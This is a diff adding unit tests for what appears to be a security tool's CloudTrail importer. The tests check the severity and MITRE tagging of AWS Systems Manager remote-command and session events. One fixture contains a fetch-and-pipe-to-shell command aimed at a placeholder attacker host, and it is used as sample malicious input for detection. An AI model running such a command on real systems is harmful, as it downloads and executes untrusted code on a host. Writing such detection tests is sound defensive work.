@@ -185,3 +185,142 @@ describe("parseCloudTrail — inputs, floor & edges", () => {
     expect(r.events).toHaveLength(0);
   });
 });
+
+// #931 item 7 — Systems Manager remote execution through the CloudTrail importer.
+describe("parseCloudTrail — SSM remote execution", () => {
+  const ssm = (
+    eventName: string,
+    requestParameters: object,
+    responseElements: object = {},
+    over: object = {},
+  ) =>
+    record({
+      eventSource: "ssm.amazonaws.com",
+      eventName,
+      readOnly: false,
+      eventID: `evt-${eventName}-${JSON.stringify(requestParameters).length}`,
+      requestParameters,
+      responseElements,
+      ...over,
+    });
+
+  it("SendCommand with a shell payload is High + T1651, names the target, document, id and status, and says 'requested'", () => {
+    const r = parseCloudTrail(
+      envelope(
+        ssm(
+          "SendCommand",
+          {
+            documentName: "AWS-RunShellScript",
+            instanceIds: ["i-0abc123def456789a"],
+            parameters: { commands: ["curl http://evil.example.invalid/x.sh | sh"] },
+          },
+          { command: { commandId: "cmd-1", documentVersion: "1", status: "Pending" } },
+        ),
+      ),
+    );
+    const e = r.events[0];
+    expect(e.severity).toBe("High");
+    expect(e.mitreTechniques).toContain("T1651");
+    expect(e.description).toContain("[AWS-RunShellScript@1] cmd-1 Pending: requested → i-0abc123def456789a");
+    expect(e.description).toContain('cmd: "curl http://evil.example.invalid/x.sh | sh"');
+    expect(e.description).toContain("result is not in CloudTrail");
+    expect(e.description).not.toMatch(/executed|as root/);
+    expect(e.canonical?.process?.commandLine).toBe("curl http://evil.example.invalid/x.sh | sh");
+    expect(e.canonical?.cloud?.resource).toBe("i-0abc123def456789a");
+  });
+
+  it("two commands to one instance, or one command to two instances, are distinct rows; a duplicate record folds", () => {
+    const a = ssm(
+      "SendCommand",
+      { documentName: "AWS-RunShellScript", instanceIds: ["i-1"], parameters: { commands: ["id"] } },
+      { command: { commandId: "cmd-A" } },
+    );
+    const b = ssm(
+      "SendCommand",
+      { documentName: "AWS-RunShellScript", instanceIds: ["i-1"], parameters: { commands: ["whoami"] } },
+      { command: { commandId: "cmd-B" } },
+    );
+    const c = ssm(
+      "SendCommand",
+      { documentName: "AWS-RunShellScript", instanceIds: ["i-2"], parameters: { commands: ["id"] } },
+      { command: { commandId: "cmd-C" } },
+    );
+    expect(parseCloudTrail(envelope(a, b, c)).events).toHaveLength(3);
+    expect(parseCloudTrail(envelope(a, a)).events).toHaveLength(1);
+  });
+
+  it("a denied SendCommand is Medium and says the request did not run; two denied attempts stay two rows", () => {
+    const d1 = ssm(
+      "SendCommand",
+      { documentName: "AWS-RunShellScript", instanceIds: ["i-1"] },
+      {},
+      { errorCode: "AccessDenied", eventID: "e1" },
+    );
+    const d2 = ssm(
+      "SendCommand",
+      { documentName: "AWS-RunShellScript", instanceIds: ["i-1"] },
+      {},
+      { errorCode: "AccessDenied", eventID: "e2" },
+    );
+    const r = parseCloudTrail(envelope(d1, d2));
+    expect(r.events).toHaveLength(2);
+    expect(r.events[0].severity).toBe("Medium");
+    expect(r.events[0].description).toContain("did not run");
+  });
+
+  it("a successful TerminateSession is Info at the importer, not the generic mutating-call Low", () => {
+    const r = parseCloudTrail(envelope(ssm("TerminateSession", { sessionId: "s-1" }, {})));
+    expect(r.events[0].severity).toBe("Info");
+    const disc = parseCloudTrail(envelope(ssm("ListCommands", {}, {}, { readOnly: false })));
+    expect(disc.events[0].severity).toBe("Info");
+  });
+
+  it("the document, id, status and target survive a long principal, user agent and tag selector", () => {
+    const targets = [
+      { Key: "tag:Name", Values: Array.from({ length: 50 }, (_, i) => `host-${i}-${"x".repeat(40)}`) },
+    ];
+    const r = parseCloudTrail(
+      envelope(
+        ssm(
+          "SendCommand",
+          { documentName: "AWS-RunShellScript", targets, parameters: { commands: ["id"] } },
+          { command: { commandId: "cmd-77", status: "Pending" } },
+          {
+            userAgent: "u".repeat(300),
+            userIdentity: { type: "IAMUser", userName: "n".repeat(200), accountId: "123" },
+          },
+        ),
+      ),
+    );
+    const d = r.events[0].description;
+    expect(d.length).toBeLessThanOrEqual(600);
+    expect(d).toContain("[AWS-RunShellScript] cmd-77 Pending: requested → ");
+    expect(d).toContain('cmd: "id"');
+  });
+
+  it("a routine patch scan is Low; a port-forwarding session is High with the tunnel technique; listing documents is Info", () => {
+    const patch = ssm(
+      "SendCommand",
+      { documentName: "AWS-RunPatchBaseline", instanceIds: ["i-1"], parameters: { Operation: ["Scan"] } },
+      { command: { commandId: "cmd-P" } },
+    );
+    const tunnel = ssm(
+      "StartSession",
+      {
+        target: "i-1",
+        documentName: "AWS-StartPortForwardingSessionToRemoteHost",
+        parameters: { host: ["db.example.invalid"], portNumber: ["3389"] },
+      },
+      { sessionId: "s-1" },
+    );
+    const list = ssm("ListDocuments", {}, {}, { readOnly: true });
+    const r = parseCloudTrail(envelope(patch, tunnel, list));
+    const by = (n: string) => r.events.find((e) => e.description.includes(`AWS ${n} `))!;
+    expect(by("SendCommand").severity).toBe("Low");
+    expect(by("StartSession").severity).toBe("High");
+    expect(by("StartSession").mitreTechniques).toEqual(expect.arrayContaining(["T1651", "T1572"]));
+    expect(by("StartSession").description).toContain("→ i-1 → db.example.invalid:3389");
+    expect(by("ListDocuments").severity).toBe("Info");
+    expect(by("ListDocuments").mitreTechniques).toEqual(["T1526"]);
+  });
+});
